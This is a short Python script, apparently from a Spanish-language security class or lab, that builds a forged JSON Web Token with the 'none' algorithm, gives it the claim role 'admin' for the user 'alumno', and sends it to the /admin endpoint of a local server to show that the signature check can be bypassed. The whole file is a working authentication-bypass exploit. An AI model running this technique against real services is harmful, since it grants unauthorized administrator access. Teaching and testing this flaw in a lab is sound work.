import base64
import json
import requests

URL = "http://127.0.0.1:5000"


def b64url_encode(datos: dict) -> str:
    crudo = json.dumps(datos, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(crudo).rstrip(b"=").decode()


header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "alumno", "role": "admin"}

token_falso = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print("Token falsificado:\n", token_falso)

r = requests.get(f"{URL}/admin", headers={"Authorization": f"Bearer {token_falso}"})
print("\n/admin ->", r.status_code, r.json())